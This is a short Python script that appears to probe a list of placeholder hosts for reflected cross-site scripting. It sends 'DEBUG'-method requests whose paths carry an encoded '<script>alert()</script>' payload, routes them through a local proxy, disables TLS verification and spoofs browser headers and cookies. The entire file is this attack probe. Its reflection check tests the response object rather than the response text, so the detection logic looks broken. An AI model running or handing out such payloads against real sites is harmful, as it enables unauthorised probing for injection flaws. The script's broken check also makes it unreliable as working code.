import requests

http_proxy  = {"http":"http://127.0.0.1:8080",
"https":"http://127.0.0.1:8080"}

urllist = {
"example1.com",
"example2.com"
}








payload = {}
headers = {
'content-type': "multipart/form-data; boundary=---011000010111000001101001",
"Connection": "close",
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2716.0 Safari/537.36",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "en-US,en;q=0.8",
"Cookie": "TS014defca=ddd; TS016fb9ff=ddd"
}

for url in urllist:


	responsehttp = requests.request("DEBUG", "http://"+url+"/%3cscript%3ealert()%3c/script%3e", headers=headers,proxies=http_proxy,verify=False)
	responsehttps=requests.request("DEBUG", "https://"+url+"/%3cscript%3ealert()%3c/script%3e", headers=headers,proxies=http_proxy,verify=False)
	if "alert" in responsehttp:
		print(url)
	if "alert" in responsehttps:
		print(url)
print()
#print(response.text)
